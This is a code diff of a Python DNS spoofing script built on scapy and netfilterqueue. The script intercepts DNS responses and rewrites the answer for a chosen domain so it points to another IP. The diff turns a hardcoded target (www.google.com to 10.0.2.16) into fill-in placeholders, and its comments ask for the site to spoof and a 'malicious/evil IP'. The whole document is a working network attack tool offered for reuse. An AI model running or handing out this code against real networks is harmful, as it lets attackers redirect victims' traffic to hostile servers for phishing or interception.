@@ -7,9 +7,9 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.google.com" in qname:
+        if " " in qname:  # Enter the website you want to spoof (e.g., www.google.com)
             print("[+] Spoofing Target")
-            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
+            answer = scapy.DNSRR(rrname=qname, rdata=" ") # Enter the IP address you want the spoofed domain to redirect to (malicious/evil IP)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
             del scapy_packet[scapy.IP].len
@@ -22,4 +22,5 @@ def process_packet(packet):
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
+
 
